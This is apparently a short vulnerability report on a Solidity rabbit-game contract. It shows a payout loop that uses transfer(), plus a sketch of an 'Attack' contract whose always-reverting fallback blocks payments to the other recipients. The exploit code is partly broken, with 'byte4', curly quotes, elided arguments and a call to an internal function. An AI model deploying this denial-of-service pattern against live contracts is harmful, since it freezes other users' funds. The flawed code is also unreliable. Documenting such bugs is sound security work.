## Vulnerable Code

```javascript
function sendMoneyMother(uint32 _bunnyId) internal {
        if (bunnyCost[_bunnyId] > 0) { 
            uint procentOne = (bunnyCost[_bunnyId].div(100)); 
            // commission_mom
            uint32[5] memory mother;
            mother = publicContract.getRabbitMother(_bunnyId);

            uint motherCount = publicContract.getRabbitMotherSumm(_bunnyId);
            if (motherCount > 0) {
                uint motherMoney = (procentOne*commission_mom).div(motherCount);
                    for (uint m = 0; m < 5; m++) {
                        if (mother[m] != 0) {  
                            publicContract.ownerOf(mother[m]).transfer(motherMoney);  //Vulnerable position 
                            emit MotherMoney(mother[m], _bunnyId, motherMoney);
                        }
                    }
                } 
        }
    }
```



## Exploit Code

```javascript
contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“sendMoneyMother(uint32)”)), ...);
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Now let's look at the position of "//Vulnerable position", as we all know 'transfer' can revert transaction if failed.so if one of 'mother' element is failed then other address will be affect. ps:"...." represent an appropriate parameter

